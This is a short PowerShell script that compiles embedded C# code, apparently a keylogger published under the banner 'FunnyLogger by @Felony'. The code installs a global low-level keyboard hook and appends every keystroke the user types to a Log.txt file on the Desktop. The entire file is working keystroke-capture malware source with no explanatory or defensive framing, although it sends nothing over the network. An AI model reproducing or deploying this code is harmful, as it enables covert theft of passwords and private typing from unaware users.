Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KL
{
	public static class Program
	{
		private static string logFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Log.txt");

		private static HookProc hookProc = HookCallback;
		private static IntPtr hookId = IntPtr.Zero;

		public static void Main() 
		{
			Console.WriteLine("FunnyLogger by @Felony ;)");
						
			hookId = SetHook(hookProc);
			Application.Run();
			UnhookWindowsHookEx(hookId);
		}

		private static IntPtr SetHook(HookProc hookProc) 
		{
			IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
			return SetWindowsHookEx(13, hookProc, moduleHandle, 0);
		}

		private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

		private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			if (nCode >= 0 && wParam == (IntPtr)0x0100) 
			{
				int vkCode = Marshal.ReadInt32(lParam);
			
				string key = ((Keys)vkCode).ToString();
				if (key.Length > 1)
					key = string.Format("[{0}] ", key);
				
				File.AppendAllText(logFilePath, key);
			}
			return CallNextHookEx(hookId, nCode, wParam, lParam);
		}
		
		[DllImport("user32.dll")]
		private static extern bool UnhookWindowsHookEx(IntPtr hhk);
		
		[DllImport("kernel32.dll")]
		private static extern IntPtr GetModuleHandle(string lpModuleName);

		[DllImport("user32.dll")]
		private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
		
		[DllImport("user32.dll")]
		private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
	}
}
"@ -ReferencedAssemblies System.Windows.Forms

[KL.Program]::Main();